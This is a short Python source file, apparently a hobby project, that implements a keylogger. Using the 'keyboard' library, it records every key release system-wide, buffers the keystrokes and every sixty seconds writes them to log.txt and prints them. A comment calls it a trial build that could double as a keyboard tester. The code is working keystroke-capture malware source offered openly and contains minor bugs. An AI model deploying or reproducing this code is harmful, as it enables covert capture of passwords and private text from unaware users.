# Trail Build and Test For Keylogger can also be used as a "keyboard tester", when used with a tkinter module

from re import L
import keyboard
from threading import Timer # To make it so that the code runs after a time interval
from datetime import datetime


Send_Report = 60 # in seconds format

class Keylogger:
  def __init__(self,interval,report_method="txt"):
    self.interval  = interval
    self.report_method = report_method
    self.log = ""                        # initialize a string which we can then copy to our output log folder , it contains all the keystrokes within self interval

    self.start_dt = datetime.now()
    self.stop_dt = datetime.now()

  def callback(self, event):
    name = event.name
    if len(name) > 1:
      if name == "space":
        name = " "
      elif name == "enter":
        name = "[enter]/n"
      elif name == "decimal":
        name = "."
      else:
        name = name.replace(" ","_")
        name = f"[{name.upper()}]"

    self.log = self.log + name  
    
  def write(self):
    # to open a file in the current directory where the .py file is running from 

    with open("log.txt","w") as f:
      print(self.log,file=f)

  


    
  def report(self):

    if self.log:
      self.end_dt = datetime.now()
      self.write()
      print(self.log)
      self.start_dt = datetime.now()

    self.log = ""
    timer = Timer(interval=self.interval, function=self.report)
    timer.daemon = True
    timer.start()

  def start(self):
    self.start_dt = datetime.now()
    keyboard.on_release(callback=self.callback)
    self.report()
    keyboard.wait()

if __name__ == "__main__":
  keylogger = Keylogger(interval=Send_Report, report_method="txt")
  keylogger.start()



    
      
